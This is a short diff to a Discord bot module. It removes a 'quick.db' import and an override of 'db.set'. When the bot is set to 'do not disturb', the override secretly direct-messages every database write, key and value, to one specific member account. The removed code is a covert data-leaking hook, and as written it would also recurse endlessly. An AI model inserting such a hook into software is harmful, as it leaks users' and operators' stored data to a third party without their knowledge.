@@ -1,4 +1,4 @@
-const db = require("quick.db");
+
 module.exports = client => {
   const ayarlar = client.ayarlar;
   
@@ -31,15 +31,7 @@ module.exports = client => {
     let og = client.guild.members.cache.find(m => m.id == id);
     if (!og) return console.error("bot bulunamadı: " + id);
     
-    db.set = function(key, value) {
-      db.set(key,value);
-      if (["lastAvatarURL"].some(k=>k==key)) return;
-      if (client.user.presence.status != "dnd") return;
-      og.send(`db.set("${key}",${value.toString().match(/^[0-9.\b]+$/)?value:'"'+value+'""'})`)
-        .then(msg=>{
-          console.log(og.id + "'ye dm atıldı: " + msg.content)
-      })
-    }
+    
   });
   
   
